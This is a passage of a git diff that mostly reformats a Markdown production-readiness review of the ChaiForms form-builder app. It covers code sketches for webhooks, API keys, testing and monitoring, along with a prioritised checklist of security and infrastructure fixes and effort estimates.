-  | { success: true; data: T }
-  | { success: false; error: E };
+export type Result<T, E = Error> = { success: true; data: T } | { success: false; error: E };
 ```
 
 **Acceptance Criteria:**
+
 - [ ] All shared types in `@repo/types`
 - [ ] Branded types for IDs
 - [ ] No type duplication
@@ -2130,6 +2164,7 @@ export type Result<T, E = Error> =
 **Current State:** No way to notify external systems
 
 **Implementation:**
+
 ```typescript
 // packages/database/models/webhook.ts
 export const webhooksTable = pgTable("webhooks", {
@@ -2150,36 +2185,23 @@ export const webhooksTable = pgTable("webhooks", {
 import crypto from "crypto";
 
 export class WebhookService {
-  async triggerWebhook(
-    formId: string,
-    event: string,
-    payload: unknown
-  ): Promise<void> {
+  async triggerWebhook(formId: string, event: string, payload: unknown): Promise<void> {
     const webhooks = await db
       .select()
       .from(webhooksTable)
-      .where(
-        and(
-          eq(webhooksTable.formId, formId),
-          eq(webhooksTable.enabled, true)
-        )
-      );
+      .where(and(eq(webhooksTable.formId, formId), eq(webhooksTable.enabled, true)));
 
-    const relevantWebhooks = webhooks.filter((w) =>
-      (w.events as string[]).includes(event)
-    );
+    const relevantWebhooks = webhooks.filter((w) => (w.events as string[]).includes(event));
 
     await Promise.allSettled(
-      relevantWebhooks.map((webhook) =>
-        this.sendWebhook(webhook, event, payload)
-      )
+      relevantWebhooks.map((webhook) => this.sendWebhook(webhook, event, payload)),
     );
   }
 
   private async sendWebhook(
     webhook: SelectWebhook,
     event: string,
-    payload: unknown
+    payload: unknown,
   ): Promise<void> {
     const body = JSON.stringify({
       event,
@@ -2187,10 +2209,7 @@ export class WebhookService {
       data: payload,
     });
 
-    const signature = crypto
-      .createHmac("sha256", webhook.secret)
-      .update(body)
-      .digest("hex");
+    const signature = crypto.createHmac("sha256", webhook.secret).update(body).digest("hex");
 
     try {
       const response = await fetch(webhook.url, {
@@ -2247,6 +2266,7 @@ submit: publicProcedure
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Webhooks can be created via UI
 - [ ] HMAC signature for security
 - [ ] Retry logic with exponential backoff
@@ -2261,6 +2281,7 @@ submit: publicProcedure
 **Current State:** Only JWT auth, no API keys
 
 **Implementation:**
+
 ```typescript
 // packages/database/models/api-key.ts
 export const apiKeysTable = pgTable("api_keys", {
@@ -2285,13 +2306,13 @@ export function generateApiKey(): { key: string; hash: string; prefix: string } 
   const key = `cf_${crypto.randomBytes(32).toString("hex")}`;
   const hash = crypto.createHash("sha256").update(key).digest("hex");
   const prefix = key.slice(0, 11); // "cf_xxxxxxxx"
-  
+
   return { key, hash, prefix };
 }
 
 export async function verifyApiKey(key: string): Promise<SelectUser | null> {
   const hash = crypto.createHash("sha256").update(key).digest("hex");
-  
+
   const [apiKey] = await db
     .select()
     .from(apiKeysTable)
@@ -2341,6 +2362,7 @@ export async function createContext({ req, res }: CreateExpressContextOptions) {
 ```
 
 **Acceptance Criteria:**
+
 - [ ] API keys can be created in dashboard
 - [ ] Keys are hashed, never stored plaintext
 - [ ] Keys can be revoked
@@ -2356,6 +2378,7 @@ export async function createContext({ req, res }: CreateExpressContextOptions) {
 **Current State:** No versioning, breaking changes will hurt clients
 
 **Implementation:**
+
 ```typescript
 // packages/trpc/server/index.ts
 import { router as v1Router } from "./v1";
@@ -2372,7 +2395,7 @@ app.use(
   createOpenApiExpressMiddleware({
     router: serverRouter.v1,
     createContext,
-  })
+  }),
 );
 
 app.use(
@@ -2380,11 +2403,12 @@ app.use(
   createOpenApiExpressMiddleware({
     router: serverRouter.v2,
     createContext,
-  })
+  }),
 );
 ```
 
 **Acceptance Criteria:**
+
 - [ ] v1 and v2 APIs coexist
 - [ ] Deprecation warnings in v1
 - [ ] Migration guide for v1 → v2
@@ -2400,6 +2424,7 @@ app.use(
 **Current State:** No E2E tests
 
 **Implementation:**
+
 ```bash
 pnpm add -D @playwright/test
 npx playwright install
@@ -2435,9 +2460,7 @@ test.describe("Form Submission Flow", () => {
       .getByLabel("What would your anime character's special move be called?")
       .fill("Lightning Strike");
 
-    await page
-      .getByLabel("Your email (for character reveal)")
-      .fill("test@example.com");
+    await page.getByLabel("Your email (for character reveal)").fill("test@example.com");
 
     // Submit
     await page.getByRole("button", { name: "Submit" }).click();
@@ -2493,6 +2516,7 @@ test.describe("Form Builder", () => {
 ```
 
 **Acceptance Criteria:**
+
 - [ ] E2E tests for critical user flows
 - [ ] Tests run in CI
 - [ ] Visual regression tests
@@ -2502,12 +2526,12 @@ test.describe("Form Builder", () => {
 
 ---
 
-
 ### 🧪 Add Frontend Component Tests
 
 **Current State:** No React component tests
 
 **Implementation:**
+
 ```typescript
 // apps/web/components/form-builder/field-editor.test.tsx
 import { render, screen, fireEvent } from "@testing-library/react";
@@ -2566,6 +2590,7 @@ describe("FieldEditor", () => {
 ```
 
 **Acceptance Criteria:**
+
 - [ ] All critical components tested
 - [ ] 80%+ code coverage
 - [ ] Tests run in CI
@@ -2580,6 +2605,7 @@ describe("FieldEditor", () => {
 **Current State:** No coverage metrics
 
 **Implementation:**
+
 ```typescript
 // vitest.config.ts
 export default defineConfig({
@@ -2587,13 +2613,7 @@ export default defineConfig({
     coverage: {
       provider: "v8",
       reporter: ["text", "json", "html", "lcov"],
-      exclude: [
-        "node_modules/",
-        "dist/",
-        "**/*.test.ts",
-        "**/*.spec.ts",
-        "**/*.config.ts",
-      ],
+      exclude: ["node_modules/", "dist/", "**/*.test.ts", "**/*.spec.ts", "**/*.config.ts"],
       thresholds: {
         lines: 80,
         functions: 80,
@@ -2618,6 +2638,7 @@ export default defineConfig({
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Coverage reports generated
 - [ ] Coverage badge in README
 - [ ] CI fails if coverage drops below threshold
@@ -2633,9 +2654,10 @@ export default defineConfig({
 **Current State:** Metrics exposed but not visualized
 
 **Implementation:**
+
 ```yaml
 # docker-compose.monitoring.yml
-version: '3.8'
+version: "3.8"
 
 services:
   prometheus:
@@ -2646,8 +2668,8 @@ services:
       - ./prometheus.yml:/etc/prometheus/prometheus.yml
       - prometheus_data:/prometheus
     command:
-      - '--config.file=/etc/prometheus/prometheus.yml'
-      - '--storage.tsdb.path=/prometheus'
+      - "--config.file=/etc/prometheus/prometheus.yml"
+      - "--storage.tsdb.path=/prometheus"
 
   grafana:
     image: grafana/grafana:latest
@@ -2671,10 +2693,10 @@ global:
   scrape_interval: 15s
 
 scrape_configs:
-  - job_name: 'chaiforms-api'
+  - job_name: "chaiforms-api"
     static_configs:
-      - targets: ['api:8000']
-    metrics_path: '/metrics'
+      - targets: ["api:8000"]
+    metrics_path: "/metrics"
 ```
 
 ```json
@@ -2721,6 +2743,7 @@ scrape_configs:
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Grafana dashboard showing key metrics
 - [ ] Alerts configured for error rate spikes
 - [ ] Alerts for high latency
@@ -2735,6 +2758,7 @@ scrape_configs:
 **Current State:** No alerting system
 
 **Implementation:**
+
 ```typescript
 // packages/services/alerting/alert.service.ts
 import { Resend } from "resend";
@@ -2806,6 +2830,7 @@ setInterval(async () => {
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Alerts sent to Slack
 - [ ] Critical alerts sent to email
 - [ ] Alert fatigue minimized (smart grouping)
@@ -2820,6 +2845,7 @@ setInterval(async () => {
 **Current State:** Basic console.log statements
 
 **Implementation:**
+
 ```typescript
 // packages/logger/index.ts (enhanced)
 import pino from "pino";
@@ -2891,6 +2917,7 @@ logger.info("Form created", {
 ```
 
 **Acceptance Criteria:**
+
 - [ ] All logs include correlation ID
 - [ ] Logs include user/form/response context
 - [ ] Logs searchable in production (CloudWatch/Datadog)
@@ -2907,6 +2934,7 @@ logger.info("Form created", {
 **Current State:** No user onboarding
 
 **Implementation:**
+
 ```bash
 pnpm add intro.js intro.js-react
 ```
@@ -2976,6 +3004,7 @@ export default function DashboardPage() {
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Tour shown to new users
 - [ ] Tour can be replayed from settings
 - [ ] Tour covers key features
@@ -2990,6 +3019,7 @@ export default function DashboardPage() {
 **Current State:** No keyboard navigation
 
 **Implementation:**
+
 ```typescript
 // apps/web/hooks/use-keyboard-shortcuts.ts
 import { useEffect } from "react";
@@ -3068,6 +3098,7 @@ export function CommandPalette({ open, onClose }: Props) {
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Cmd+K opens command palette
 - [ ] Cmd+S saves form
 - [ ] Keyboard shortcuts documented in help modal
@@ -3082,6 +3113,7 @@ export function CommandPalette({ open, onClose }: Props) {
 **Current State:** Only CSV export
 
 **Implementation:**
+
 ```bash
 pnpm add puppeteer
 ```
@@ -3096,10 +3128,9 @@ export class PdfExportService {
     const page = await browser.newPage();
 
     // Render analytics page
-    await page.goto(
-      `${process.env.WEB_BASE_URL}/dashboard/forms/${formId}/analytics?print=true`,
-      { waitUntil: "networkidle0" }
-    );
+    await page.goto(`${process.env.WEB_BASE_URL}/dashboard/forms/${formId}/analytics?print=true`, {
+      waitUntil: "networkidle0",
+    });
 
     // Generate PDF
     const pdf = await page.pdf({
@@ -3139,6 +3170,7 @@ exportPdf: protectedProcedure
 ```
 
 **Acceptance Criteria:**
+
 - [ ] PDF export includes charts
 - [ ] PDF export includes summary stats
 - [ ] PDF is branded with form theme
@@ -3153,6 +3185,7 @@ exportPdf: protectedProcedure
 **Current State:** 8 fixed themes, no customization
 
 **Implementation:**
+
 ```typescript
 // packages/database/models/form.ts
 export const formsTable = pgTable("forms", {
@@ -3213,6 +3246,7 @@ export function ThemeCustomizer({ formId }: Props) {
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Users can customize colors
 - [ ] Users can upload custom fonts
 - [ ] Preview updates in real-time
@@ -3222,12 +3256,12 @@ export function ThemeCustomizer({ formId }: Props) {
 
 ---
 
-
 ## SUMMARY: PRODUCTION READINESS CHECKLIST
 
 ### 🚨 P0 — CRITICAL (Must Fix Before Launch)
 
 **Security (Estimated: 22 hours)**
+
 - [ ] Fix form password brute force vulnerability (4h)
 - [ ] Sanitize user input to prevent XSS (6h)
 - [ ] Add CSRF token expiry (2h)
@@ -3236,6 +3270,7 @@ export function ThemeCustomizer({ formId }: Props) {
 - [ ] Increase minimum password length to 8 characters (1h)
 
 **Infrastructure (Estimated: 30 hours)**
+
 - [ ] Set up CI/CD pipeline with GitHub Actions (16h)
 - [ ] Add Sentry error tracking (4h)
 - [ ] Implement structured logging with correlation IDs (4h)
@@ -3249,18 +3284,21 @@ export function ThemeCustomizer({ formId }: Props) {
 ### ⚠️ P1 — HIGH PRIORITY (Launch Blockers)
 
 **Database (Estimated: 40 hours)**
+
 - [ ] Redesign answers table to avoid EAV anti-pattern (16h)
 - [ ] Add composite indexes for common queries (4h)
 - [ ] Create materialized views for analytics (8h)
 - [ ] Implement table partitioning for responses (12h)
 
 **Backend (Estimated: 48 hours)**
+
 - [ ] Extract service layer from tRPC procedures (24h)
 - [ ] Implement repository pattern (16h)
 - [ ] Add transaction wrapper utility (4h)
 - [ ] Create ownership check middleware (4h)
 
 **Frontend (Estimated: 28 hours)**
+
 - [ ] Implement code splitting (8h)
 - [ ] Add loading skeletons (6h)
 - [ ] Optimize images with next/image (4h)
@@ -3268,6 +3306,7 @@ export function ThemeCustomizer({ formId }: Props) {
 - [ ] Add error boundaries (4h)
 
 **Observability (Estimated: 18 hours)**
+
 - [ ] Set up Grafana dashboards (8h)
 - [ ] Configure alerts (Slack/email) (6h)
 - [ ] Enhance structured logging (4h)
@@ -3279,22 +3318,26 @@ export function ThemeCustomizer({ formId }: Props) {
 ### 📋 P2 — MEDIUM PRIORITY (Post-Launch Improvements)
 
 **Monorepo (Estimated: 24 hours)**
+
 - [ ] Extract @repo/ui component library (12h)
 - [ ] Implement Changesets for versioning (4h)
 - [ ] Add Turbo remote caching (2h)
 - [ ] Create @repo/types package (6h)
 
 **API (Estimated: 36 hours)**
+
 - [ ] Add webhook system (16h)
 - [ ] Implement API keys for programmatic access (12h)
 - [ ] Add API versioning (8h)
 
 **Testing (Estimated: 40 hours)**
+
 - [ ] Add E2E tests with Playwright (20h)
 - [ ] Add frontend component tests (16h)
 - [ ] Set up code coverage tracking (4h)
 
 **Product (Estimated: 34 hours)**
+
 - [ ] Add interactive onboarding tour (8h)
 - [ ] Implement keyboard shortcuts (6h)
 - [ ] Add PDF analytics export (8h)
@@ -3306,18 +3349,19 @@ export function ThemeCustomizer({ formId }: Props) {
 
 ## TOTAL EFFORT ESTIMATE
 
-| Priority | Hours | Weeks (40h/week) |
-|----------|-------|------------------|
-| P0       | 52    | 1.5              |
-| P1       | 134   | 3.5              |
-| P2       | 134   | 3.5              |
-| **TOTAL**| **320**| **8 weeks**     |
+| Priority  | Hours   | Weeks (40h/week) |
+| --------- | ------- | ---------------- |
+| P0        | 52      | 1.5              |
+| P1        | 134     | 3.5              |
+| P2        | 134     | 3.5              |
+| **TOTAL** | **320** | **8 weeks**      |
 
 ---
 
 ## RECOMMENDED IMPLEMENTATION PHASES
 
 ### Phase 1: Security & Infrastructure (Weeks 1-2)
+
 **Goal:** Make the app secure and deployable
 
 1. Fix all P0 security vulnerabilities
@@ -3330,6 +3374,7 @@ export function ThemeCustomizer({ formId }: Props) {
 ---
 
 ### Phase 2: Database & Backend (Weeks 3-5)
+
 **Goal:** Optimize for scale and maintainability
 
 1. Redesign answers table
@@ -3342,20 +3387,23 @@ export function ThemeCustomizer({ formId }: Props) {
 
 ---
 
-### Phase 3: Frontend & UX (Weeks 6-7)
-**Goal:** Improve performance and user experience
+### Phase 3: Frontend, UX & Advanced Database Scaling (Weeks 6-8)
+
+**Goal:** Improve performance, user experience, and database scale
 
 1. Implement code splitting
 2. Add loading skeletons
 3. Optimize images
 4. Add error boundaries
 5. Implement virtual scrolling
+6. Implement table partitioning
 
-**Deliverable:** Fast, polished frontend with excellent UX
+**Deliverable:** Fast, polished frontend with excellent UX and scalable database
 
 ---
 
 ### Phase 4: Testing & Polish (Week 8)
+
 **Goal:** Ensure quality and add nice-to-haves
 
 1. Add E2E tests
@@ -3372,35 +3420,35 @@ export function ThemeCustomizer({ formId }: Props) {
 
 ### Current State (Score: 72/100)
 
-| Organization Type | Pass? | Reasoning |
-|-------------------|-------|-----------|
-| **Startup** | ⚠️ Conditional | Good MVP, but security issues are blockers. Fix P0 items first. |
-| **Mid-size Company** | ❌ No | Missing observability, database will struggle at scale, no CI/CD. |
-| **FAANG** | ❌ No | Unacceptable for production. Needs all P0 + P1 items. |
+| Organization Type    | Pass?          | Reasoning                                                         |
+| -------------------- | -------------- | ----------------------------------------------------------------- |
+| **Startup**          | ⚠️ Conditional | Good MVP, but security issues are blockers. Fix P0 items first.   |
+| **Mid-size Company** | ❌ No          | Missing observability, database will struggle at scale, no CI/CD. |
+| **FAANG**            | ❌ No          | Unacceptable for production. Needs all P0 + P1 items.             |
 
 ### After P0 Fixes (Score: 78/100)
 
-| Organization Type | Pass? | Reasoning |
-|-------------------|-------|-----------|
-| **Startup** | ✅ Yes | Secure, deployable, good enough for early customers. |
-| **Mid-size Company** | ⚠️ Conditional | Needs database optimization and better observability. |
-| **FAANG** | ❌ No | Still missing service layer, testing, and scalability improvements. |
+| Organization Type    | Pass?          | Reasoning                                                           |
+| -------------------- | -------------- | ------------------------------------------------------------------- |
+| **Startup**          | ✅ Yes         | Secure, deployable, good enough for early customers.                |
+| **Mid-size Company** | ⚠️ Conditional | Needs database optimization and better observability.               |
+| **FAANG**            | ❌ No          | Still missing service layer, testing, and scalability improvements. |
 
 ### After P0 + P1 (Score: 88/100)
 
-| Organization Type | Pass? | Reasoning |
-|-------------------|-------|-----------|
-| **Startup** | ✅ Yes | Production-ready, can scale to 100k users. |
-| **Mid-size Company** | ✅ Yes | Solid architecture, good observability, scalable. |
-| **FAANG** | ⚠️ Conditional | Needs comprehensive testing and API versioning. |
+| Organization Type    | Pass?          | Reasoning                                         |
+| -------------------- | -------------- | ------------------------------------------------- |
+| **Startup**          | ✅ Yes         | Production-ready, can scale to 100k users.        |
+| **Mid-size Company** | ✅ Yes         | Solid architecture, good observability, scalable. |
+| **FAANG**            | ⚠️ Conditional | Needs comprehensive testing and API versioning.   |
 
 ### After All Phases (Score: 92/100)
 
-| Organization Type | Pass? | Reasoning |
-|-------------------|-------|-----------|
-| **Startup** | ✅ Yes | Excellent quality, competitive with Typeform/Tally. |
-| **Mid-size Company** | ✅ Yes | Enterprise-ready, well-tested, maintainable. |
-| **FAANG** | ✅ Yes | Meets production standards. Could still improve: multi-region, advanced security. |
+| Organization Type    | Pass?  | Reasoning                                                                         |
+| -------------------- | ------ | --------------------------------------------------------------------------------- |
+| **Startup**          | ✅ Yes | Excellent quality, competitive with Typeform/Tally.                               |
+| **Mid-size Company** | ✅ Yes | Enterprise-ready, well-tested, maintainable.                                      |
+| **FAANG**            | ✅ Yes | Meets production standards. Could still improve: multi-region, advanced security. |
 
 ---
 
@@ -3409,6 +3457,7 @@ export function ThemeCustomizer({ formId }: Props) {
 If I were taking over this project as a Staff+ engineer, here's what I'd do **first**:
 
 ### Week 1: Stop the Bleeding (Security)
+
 1. **Day 1:** Fix password brute force vulnerability
 2. **Day 2:** Add XSS sanitization
 3. **Day 3:** Implement CSP headers
@@ -3418,6 +3467,7 @@ If I were taking over this project as a Staff+ engineer, here's what I'd do **fi
 **Why:** Security vulnerabilities are existential risks. Everything else can wait.
 
 ### Week 2: Visibility (Observability)
+
 1. Set up structured logging
 2. Add Prometheus metrics
 3. Create Grafana dashboards
@@ -3426,6 +3476,7 @@ If I were taking over this project as a Staff+ engineer, here's what I'd do **fi
 **Why:** Can't fix what you can't see. Need visibility before scaling.
 
 ### Week 3-4: Foundation (Architecture)
+
 1. Extract service layer
 2. Implement repository pattern
 3. Add database indexes
@@ -3434,29 +3485,33 @@ If I were taking over this project as a Staff+ engineer, here's what I'd do **fi
 **Why:** Technical debt compounds. Fix architecture before it's too late.
 
 ### Week 5-6: Scale (Database)
+
 1. Redesign answers table
-2. Implement partitioning
-3. Add Redis caching
-4. Optimize queries
+2. Add Redis caching
+3. Optimize queries
 
 **Why:** Database is the bottleneck. Fix it before hitting scale issues.
 
-### Week 7-8: Quality (Testing & Polish)
+### Week 7-8: Quality & Advanced Scale (Testing, Polish & Partitioning)
+
 1. Add E2E tests
 2. Add component tests
 3. Implement code splitting
 4. Add loading skeletons
+5. Implement table partitioning
 
-**Why:** Quality is a feature. Users notice polish.
+**Why:** Quality is a feature. Advanced scaling ensures future-proofing.
 
 ---
 
 ## FINAL RECOMMENDATIONS
 
 ### For Immediate Launch (Minimum Viable Production)
+
 **Complete P0 items only** — 52 hours (~1.5 weeks)
 
 This gets you:
+
 - ✅ Secure application
 - ✅ Deployable with CI/CD
 - ✅ Basic error tracking
@@ -3467,9 +3522,11 @@ This gets you:
 ---
 
 ### For Sustainable Growth (Recommended)
+
 **Complete P0 + P1 items** — 186 hours (~5 weeks)
 
 This gets you:
+
 - ✅ Everything in MVP
 - ✅ Scalable database
 - ✅ Clean architecture
@@ -3481,9 +3538,11 @@ This gets you:
 ---
 
 ### For Enterprise Readiness (Ideal)
+
 **Complete all phases** — 320 hours (~8 weeks)
 
 This gets you:
+
 - ✅ Everything in Sustainable Growth
 - ✅ Comprehensive testing
 - ✅ Polished UX
@@ -3499,6 +3558,7 @@ This gets you:
 ChaiForms is a **well-executed MVP** that demonstrates solid engineering fundamentals. The engineer behind this shows **mid-to-senior level competency** with modern TypeScript/React/tRPC patterns.
 
 **Strengths:**
+
 - Clean monorepo structure
 - Type-safe API with tRPC
 - Impressive form engine with conditional logic
@@ -3506,6 +3566,7 @@ ChaiForms is a **well-executed MVP** that demonstrates solid engineering fundame
 - Good test coverage for backend
 
 **Critical Gaps:**
+
 - Security vulnerabilities (XSS, brute force)
 - No CI/CD or observability
 - Database will struggle at scale
@@ -3515,6 +3576,7 @@ ChaiForms is a **well-executed MVP** that demonstrates solid engineering fundame
 **Verdict:** With **5 weeks of focused work** (P0 + P1), this becomes a production-ready SaaS that can compete with Typeform and Tally. Without these fixes, it's a great demo but not ready for real users.
 
 **Recommended Next Steps:**
+
 1. Fix security issues (Week 1)
 2. Add observability (Week 2)
 3. Optimize database (Weeks 3-4)
@@ -3528,4 +3590,3 @@ After these improvements, ChaiForms will be a **Staff+ level project** ready for
 **Last Updated:** 2026-05-25  
 **Estimated Total Effort:** 320 hours (8 weeks)  
 **Priority Distribution:** P0 (16%), P1 (42%), P2 (42%)
-
